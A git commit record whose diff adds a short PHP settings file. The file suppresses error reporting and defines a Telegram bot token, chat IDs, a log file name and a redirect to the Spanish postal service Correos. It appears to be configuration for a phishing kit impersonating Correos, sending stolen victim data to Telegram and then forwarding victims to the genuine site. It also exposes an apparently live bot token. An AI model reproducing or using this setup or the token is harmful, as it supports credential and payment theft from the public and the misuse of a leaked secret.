3a71abc2d1f7d4e2e6fa03d3db9f63e2cc3e3c23
splinterLor <47502415+splinterLor@users.noreply.github.com>
2022-12-19 23:14:18 +0100

    delete

---
+++ settings/conf.php
@@ -0,0 +1,13 @@
+<?php
+
+error_reporting(0);
+
+define("TELEGRAM_TOKEN", "1953542316:AAGj4DIm3dBm2s9kilj5TpWEwYBJD9LbezY");
+define("TELEGRAM_CHAT_ID", "1001749903053");
+define("TELEGRAM_CHAT_IDD", "-1001749903053");
+define("TXT_FILE_NAME", 'mjinina.txt');
+define("REDIRECT_WEBSITE", "https://www.correos.com/grupo-correos/");
+
+
+
+?>
